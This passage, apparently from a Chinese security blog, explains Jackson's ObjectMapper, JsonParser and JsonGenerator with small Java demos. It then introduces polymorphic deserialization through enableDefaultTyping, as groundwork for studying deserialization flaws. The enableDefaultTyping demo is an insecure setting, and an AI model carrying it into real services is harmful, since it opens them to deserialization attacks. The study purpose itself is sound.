<h2 id="0x02-组件分析"><a href="#0x02-组件分析" class="headerlink" title="0x02 组件分析"></a>0x02 组件分析</h2><h3 id="1x01-ObjectMapper"><a href="#1x01-ObjectMapper" class="headerlink" title="1x01 ObjectMapper"></a>1x01 ObjectMapper</h3><p>他是 jackson 中最常用的 API，之所以被叫做 ObjectMapper，就是因为它将 json 映射到 java 对象（反序列化），或者将 java 对象映射到 json（序列化）<br>objectMapper 作用范围很多：能够从字符串，流或者文件中解析 JSON</p>
<h4 id="2x01-将-json-转化为对象"><a href="#2x01-将-json-转化为对象" class="headerlink" title="2x01 将 json 转化为对象"></a>2x01 将 json 转化为对象</h4><p>直接看测试类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> json<span class="token operator">=</span><span class="token string">"&#123;\"name\":\"John\", \"age\":30&#125;"</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">Person</span> person<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span><span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>person 类就不写了，按照例写字段属性值就行<br>输出结果如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710483206856-33cbe15f-0766-41ca-a845-b23303b00fb7.png#averageHue=%2371899f&clientId=ucb2b9ec1-2be2-4&from=paste&height=37&id=ud361491f&originHeight=56&originWidth=465&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=11197&status=done&style=none&taskId=uee643f85-3664-47fe-9b68-a8008aa7853&title=&width=310" referrerpolicy="no-referrer" alt="image.png"></p>
<h4 id="2x02-将对象转化为-json"><a href="#2x02-将对象转化为-json" class="headerlink" title="2x02 将对象转化为 json"></a>2x02 将对象转化为 json</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">//String json="&#123;\"name\":\"John\", \"age\":30&#125;";</span>
        <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Person</span> person<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token comment">//Person person=objectMapper.readValue(json,Person.class);</span>
            <span class="token class-name">String</span> json<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果如下：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710483137818-f7419be1-e7bb-44da-b20a-3598f5533e63.png#averageHue=%239fb3b8&clientId=ucb2b9ec1-2be2-4&from=paste&height=37&id=ub309dc1b&originHeight=55&originWidth=520&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=11729&status=done&style=none&taskId=u8a207312-270c-4c15-a76e-6f453de632a&title=&width=346.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>其实还有很多方法</p>
<ul>
<li>writeValue()</li>
<li>writeValueAsString()</li>
<li>writeValueAsBytes()</li>
</ul>
<p>这里就不一一列举了</p>
<h3 id="1x02-JsonParser"><a href="#1x02-JsonParser" class="headerlink" title="1x02 JsonParser"></a>1x02 JsonParser</h3><p>jackson JsonParser 是一个底层一些的 JSON 解析器，也就是说 jsonparser 用起来其实要比 ObjectMapper 还要更快，只不过用的前提要比 ObjectMapper 麻烦</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonParser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonToken</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test2 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> json<span class="token operator">=</span><span class="token string">"&#123;\"name\":\"John\", \"age\":30&#125;"</span><span class="token punctuation">;</span>
        <span class="token class-name">JsonFactory</span> jsonFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JsonFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">JsonParser</span> jsonParser<span class="token operator">=</span>jsonFactory<span class="token punctuation">.</span><span class="token function">createParser</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>jsonParser<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token class-name">JsonToken</span> jsonToken<span class="token operator">=</span>jsonParser<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonToken<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710484195346-c4ba000a-0e76-4ed7-aff4-e00a12b87dac.png#averageHue=%23373b3d&clientId=u20247fd2-a5d8-4&from=paste&height=227&id=ue006a4a8&originHeight=340&originWidth=774&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=62414&status=done&style=none&taskId=u3e4c4e8d-f1d6-4db0-be54-2cfb72de3cf&title=&width=516" referrerpolicy="no-referrer" alt="image.png"><br>JsonParser 的工作方式是将 json 分解为一系列的令牌，可以一个一个迭代令牌，这些令牌其实是一个一个的字段属性值<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710484100297-6b4eb244-2102-4a9a-bda8-c74c4e3f275d.png#averageHue=%23494e53&clientId=u20247fd2-a5d8-4&from=paste&height=255&id=ua705d281&originHeight=382&originWidth=587&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=114062&status=done&style=none&taskId=uc809272b-e082-4141-b8b2-53c7913b064&title=&width=391.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>我们可以通过 equals 方法来判断当前生成的这一系列的令牌的键值对名是否为想要反序列化类的属性值名，然后通过getValueAsString 等方法获取出来</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonParser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonToken</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test2 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> json <span class="token operator">=</span> <span class="token string">"&#123;\"name\":\"fakes0u1\",\"age\":123&#125;"</span><span class="token punctuation">;</span>
        <span class="token class-name">JsonFactory</span> jsonFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JsonFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">JsonParser</span> parser <span class="token operator">=</span> jsonFactory<span class="token punctuation">.</span><span class="token function">createParser</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>parser<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token class-name">JsonToken</span> jsonToken <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">JsonToken</span><span class="token punctuation">.</span><span class="token constant">FIELD_NAME</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>jsonToken<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token class-name">String</span> fieldName <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">getCurrentName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>

                    jsonToken<span class="token operator">=</span>parser<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span><span class="token function">getValueAsString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>parser<span class="token punctuation">.</span><span class="token function">getValueAsInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>

            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710484957545-d6dbb83d-33b6-4546-a1ab-a3f238d8e5f1.png#averageHue=%23b1b7b3&clientId=u20247fd2-a5d8-4&from=paste&height=135&id=u67d0e098&originHeight=202&originWidth=442&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=20386&status=done&style=none&taskId=u8716ad36-e009-4314-9921-cdb04bfca49&title=&width=294.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>首先判断当前取到的 token 是不是 field，也就是字段属性，如果是的话那我们就可以通过 parser 去获取当前的字段属性了</p>
<h3 id="1x03-JsonGenerator"><a href="#1x03-JsonGenerator" class="headerlink" title="1x03 JsonGenerator"></a>1x03 JsonGenerator</h3><p>JsonGenerator 只作用于 java 对象到 json 字符串的转化</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonEncoding</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonFactory</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">JsonGenerator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">jdk<span class="token punctuation">.</span>nashorn<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span>regexp<span class="token punctuation">.</span></span><span class="token class-name">JoniRegExp</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> test3 <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">JsonFactory</span> jsonFactory<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">JsonFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Person</span> person<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">JsonGenerator</span> jsonGenerator<span class="token operator">=</span>jsonFactory<span class="token punctuation">.</span><span class="token function">createGenerator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"output.json"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">JsonEncoding</span><span class="token punctuation">.</span><span class="token constant">UTF8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            jsonGenerator<span class="token punctuation">.</span><span class="token function">writeStartObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            jsonGenerator<span class="token punctuation">.</span><span class="token function">writeStringField</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            jsonGenerator<span class="token punctuation">.</span><span class="token function">writeNumberField</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            jsonGenerator<span class="token punctuation">.</span><span class="token function">writeEndObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            jsonGenerator<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用起来还是比较麻烦的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710485398908-ef1eeabb-55ab-450d-8d2b-dad070d911a8.png#averageHue=%23454a4c&clientId=u20247fd2-a5d8-4&from=paste&height=99&id=u00de1508&originHeight=148&originWidth=1128&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65898&status=done&style=none&taskId=u746e5272-01e0-4839-a986-bd709fab336&title=&width=752" referrerpolicy="no-referrer" alt="image.png"></p>
<p>如果平常有序列化和反序列化的需求，一般都是用 ObjectMapper 了，他里面的<code>writeValueAsString()</code>以及<code>readValue()</code>方法都挺方便的，我们待会要进的流程也是从两者进入</p>
<h3 id="1x04-多态问题解决–-JacksonPolymorphicDeserialization"><a href="#1x04-多态问题解决–-JacksonPolymorphicDeserialization" class="headerlink" title="1x04 多态问题解决– JacksonPolymorphicDeserialization"></a>1x04 多态问题解决– JacksonPolymorphicDeserialization</h3><p>java 中多态的定义就不多谈了，就是同一个接口由于有其不同的实例而执行不同的操作，而在 jackson 中也需要解决这个问题<br>在 jackson 中， 一般是使用 JacksonPolymorphicDeserialization 来解决，在反序列化某个对象的过程中，如果类成员不是具体的类型，比如是 Object 类型的接口或者抽象类，那么我们可以在 JSON 字符串中指定出来具体的类型，jackson 将根据我们指定的具体类型来生成指定的类型实例<br>简单来说就是将具体的子类信息绑定到 json 序列化数据中就行，只不过前提是我们这个类成员类型不能是具体的，不然就不叫多态了<br>具体实现呢，就是 DefaultTyping 和<code>@JsonTypeInfo</code>注解来实现<br>先看 DefaultTyping</p>
<h4 id="2x01-DefaultTyping"><a href="#2x01-DefaultTyping" class="headerlink" title="2x01 DefaultTyping"></a>2x01 DefaultTyping</h4><p>DefaultTyping 本身就存在于 ObjectMapper 的子类定义中，然后它里面包含了 4 个值<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710487277442-86c47853-640e-4943-8ade-30e25187df41.png#averageHue=%233f434c&clientId=u20247fd2-a5d8-4&from=paste&height=411&id=u62dda23c&originHeight=616&originWidth=598&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=170563&status=done&style=none&taskId=u74a58702-4b54-44ac-bc9a-968f4129222&title=&width=398.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这 4 个值也就代表着我们能够通过 jackson 去解决多态问题的条件</p>
<h5 id="3x01-JAVA-LANG-OBJECT"><a href="#3x01-JAVA-LANG-OBJECT" class="headerlink" title="3x01 JAVA_LANG_OBJECT"></a>3x01 JAVA_LANG_OBJECT</h5><p> 当被序列化或反序列化的类里的属性被声明为一个Object类型时 会对该Object类型的属性进行序列化和反序列化 并明确规定类名  </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JacksonPD</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
            person2 person2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">person2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            person2<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            person2<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"stoocea"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            person2<span class="token punctuation">.</span><span class="token function">setobject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">ObjectMapper</span> objectMapper<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            objectMapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">JAVA_LANG_OBJECT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">String</span> json<span class="token operator">=</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>person2<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">&#125;</span>


<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
